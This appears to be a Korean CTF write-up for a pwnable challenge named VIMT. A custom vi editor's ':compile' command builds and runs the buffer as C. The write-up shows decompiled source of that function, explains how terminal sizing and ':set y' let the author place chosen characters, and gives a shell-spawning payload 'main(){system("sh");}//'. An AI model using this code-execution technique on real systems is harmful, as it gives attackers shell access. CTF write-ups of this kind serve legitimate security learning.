# CTF_ENV

### CTF 포너블 기초 환경 세팅

https://psj-study.tistory.com/56
see my Docker Manual


# VIMT

## Vuln

커스텀 VI에 내용을 적고 "ESC"+":compile"을 해주면 원하는 c코드를 컴파일 후 실행시킬 수 있다.  
VI에서 x와 y값에 따라 연산을 하는데 ssh로 접속하기 때문에 최대 x(가로)와 최대y(세로)크기를 원하는대로 조절해줄 수 있다.

입력한 값(1)+랜덤한값(5)= 입력 하나당 총 6글자가 들어가는데 뒤에 원하는 코드를 쓰면 system("sh")를 컴파일해낼 수 있다.

어떻게 원하는 x자리에 값을 쓸 수 있는지 손퍼징 한 결과

먼저 첫 글자는 그대로 써진 이후에  
원하는 값 10번 치기+":set y 0"+원하는 값을 하면 처음 글자 이후에 순서대로 글을 쓸 수 있다.

```
__int64 compile()
{
  size_t v0; // rax
  size_t v1; // rax
  size_t v2; // rax
  size_t v3; // rax
  size_t v5; // [rsp+8h] [rbp-78h]
  char *command; // [rsp+38h] [rbp-48h]
  int v7; // [rsp+44h] [rbp-3Ch]
  char *name; // [rsp+48h] [rbp-38h]
  char *file; // [rsp+50h] [rbp-30h]
  char *s; // [rsp+58h] [rbp-28h]
  int j; // [rsp+64h] [rbp-1Ch]
  int i; // [rsp+68h] [rbp-18h]
  int v13; // [rsp+6Ch] [rbp-14h]
  char *v14; // [rsp+70h] [rbp-10h]

  v14 = (char *)calloc(1uLL, (y + 1) * (x + 1) + 1);
  v13 = 0;
  for ( i = 0; i < y; ++i )
  {
    for ( j = 0; j < x; ++j )
    {
      v14[v13] = *(_BYTE *)(*(_QWORD *)(map + 8LL * i) + j);
      if ( !v14[v13] )
        v14[v13] = 32;
      ++v13;
    }
  }
  s = randomHexString(0x20);
  v0 = strlen(s);
  file = (char *)calloc(1uLL, v0 + 7);
  sprintf(file, "tmp/%s.c", s);
  v1 = strlen(s);
  name = (char *)calloc(1uLL, v1 + 7);
  sprintf(name, "tmp/%s", s);
  v7 = open(file, 66, 420LL);
  if ( v7 >= 0 )
  {
    v2 = strlen(v14);
    write(v7, v14, v2);
    close(v7);
    v5 = strlen(file);
    v3 = strlen(name);
    command = (char *)calloc(1uLL, v3 + v5 + 9);
    sprintf(command, "gcc -o %s %s", name, file);
    system(command);
    if ( !access(name, 0) )
      system(name);
    free(command);
    free(name);
    free(file);
    free(v14);
    free(s);
    return 0;
  }
  else
  {
    return (unsigned int)-1;
  }
}
```

위의 방법대로 VI에 원하는 글자를 적을 수 있게 되어서 아래 코드를 입력한 뒤에 "ESC"+":compile"을 해주면 된다.

ssh라서 수작업으로 해야되서 헤더파일과 main함수의 type은 요즘 똑똑한 gcc가 자동으로 삽입해주는 것을 이용해 c코드를 최소한으로 했다.

맨 마지막에 랜덤한 값들이 남아있으니 //로 주석까지 처리해주면 쉘이 호출된다.

"sh");}// 부터는 y가 1로 설정되기에 "ESC"+":set y 1"을 해줘야 값을 이어서 쓸 수 있다.

```
main(){system("sh");}//
```

![img](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FMhyVW%2FbtruFearBV8%2Fsasyuqkumk2rVFqQnDOJCk%2Fimg.jpg)
